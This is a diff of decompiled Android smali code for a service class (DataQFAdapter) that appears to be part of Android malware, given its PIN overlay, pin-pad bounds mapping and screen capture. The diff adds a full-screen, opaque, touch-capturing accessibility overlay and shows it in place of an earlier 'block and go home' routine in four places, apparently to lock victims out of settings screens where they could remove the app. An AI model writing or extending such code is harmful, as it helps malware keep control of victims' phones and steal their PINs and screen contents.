@@ -533,6 +533,10 @@
 
 .field private pinOverlayView:Landroid/view/View;
 
+.field private volatile settBlockOverlayActive:Z
+
+.field private settBlockOverlayView:Landroid/view/View;
+
 .field private pinPadBoundsMap:Ljava/util/HashMap;
     .annotation system Ldalvik/annotation/Signature;
         value = {
@@ -8671,6 +8675,135 @@
     return-void
 .end method
 
+.method private final showSettBlockOverlay()V
+    .locals 9
+
+    .line 1
+    iget-boolean v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->settBlockOverlayActive:Z
+
+    .line 2
+    if-nez v0, :cond_active
+
+    .line 3
+    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->accessWindowManager:Landroid/view/WindowManager;
+
+    .line 4
+    if-eqz v0, :cond_no_wm
+
+    .line 5
+    :try_start_0
+    new-instance v1, Landroid/view/View;
+
+    .line 6
+    invoke-direct {v1, p0}, Landroid/view/View;-><init>(Landroid/content/Context;)V
+
+    .line 7
+    const v2, 0xff000000
+
+    .line 8
+    invoke-virtual {v1, v2}, Landroid/view/View;->setBackgroundColor(I)V
+
+    .line 9
+    const/4 v2, 0x1
+
+    .line 10
+    invoke-virtual {v1, v2}, Landroid/view/View;->setClickable(Z)V
+
+    .line 11
+    invoke-virtual {v1, v2}, Landroid/view/View;->setLongClickable(Z)V
+
+    .line 12
+    new-instance v3, Landroid/view/WindowManager$LayoutParams;
+
+    .line 13
+    const/4 v4, -0x1
+
+    .line 14
+    const/4 v5, -0x1
+
+    .line 15
+    const v6, 0x7f0
+
+    .line 16
+    const/16 v7, 0x8
+
+    .line 17
+    const/16 v8, -0x3
+
+    .line 18
+    invoke-direct/range {v3 .. v8}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V
+
+    .line 19
+    invoke-interface {v0, v1, v3}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V
+
+    .line 20
+    iput-object v1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->settBlockOverlayView:Landroid/view/View;
+
+    .line 21
+    const/4 v0, 0x1
+
+    .line 22
+    iput-boolean v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->settBlockOverlayActive:Z
+    :try_end_0
+    .catchall {:try_start_0 .. :try_end_0} :catchall_0
+
+    :cond_active
+    :cond_no_wm
+    return-void
+
+    :catchall_0
+    move-exception v0
+    return-void
+.end method
+
+.method private final hideSettBlockOverlay()V
+    .locals 2
+
+    .line 1
+    iget-boolean v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->settBlockOverlayActive:Z
+
+    .line 2
+    if-eqz v0, :cond_not_active
+
+    .line 3
+    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->settBlockOverlayView:Landroid/view/View;
+
+    .line 4
+    if-eqz v0, :cond_clear
+
+    .line 5
+    sget-object v1, Lapp/mobilex/plus/services/DataQFAdapter;->accessWindowManager:Landroid/view/WindowManager;
+
+    .line 6
+    if-eqz v1, :cond_clear
+
+    .line 7
+    :try_start_0
+    invoke-interface {v1, v0}, Landroid/view/ViewManager;->removeView(Landroid/view/View;)V
+    :try_end_0
+    .catchall {:try_start_0 .. :try_end_0} :catchall_0
+
+    .line 8
+    :cond_clear
+    const/4 v0, 0x0
+
+    .line 9
+    iput-boolean v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->settBlockOverlayActive:Z
+
+    .line 10
+    iput-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->settBlockOverlayView:Landroid/view/View;
+
+    :cond_not_active
+    return-void
+
+    :catchall_0
+    move-exception v0
+    const/4 v1, 0x0
+    iput-boolean v1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->settBlockOverlayActive:Z
+    iput-object v1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->settBlockOverlayView:Landroid/view/View;
+    return-void
+.end method
+
 .method private final captureScreenInternal(Lv/s/deLJ4Z0aL3hcJ3O1;)V
     .locals 3
     .annotation build Landroid/annotation/SuppressLint;
@@ -12948,6 +13081,8 @@
     if-nez p1, :cond_1
 
     .line 69
+    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->hideSettBlockOverlay()V
+
     .line 70
     goto/16 :goto_4
 
@@ -13140,7 +13275,7 @@
     .line 153
     .line 154
     .line 155
-    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->blockAndGoHome()V
+    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->showSettBlockOverlay()V
     :try_end_1
     .catchall {:try_start_1 .. :try_end_1} :catchall_0
 
@@ -13312,7 +13447,7 @@
     .line 230
     .line 231
     .line 232
-    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->blockAndGoHome()V
+    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->showSettBlockOverlay()V
     :try_end_3
     .catchall {:try_start_3 .. :try_end_3} :catchall_0
 
@@ -13586,7 +13721,7 @@
     .line 345
     .line 346
     .line 347
-    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->blockAndGoHome()V
+    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->showSettBlockOverlay()V
 
     .line 348
     .line 349
@@ -13782,7 +13917,7 @@
     .line 433
     .line 434
     .line 435
-    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->blockAndGoHome()V
+    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->showSettBlockOverlay()V
     :try_end_b
     .catchall {:try_start_b .. :try_end_b} :catchall_0
 
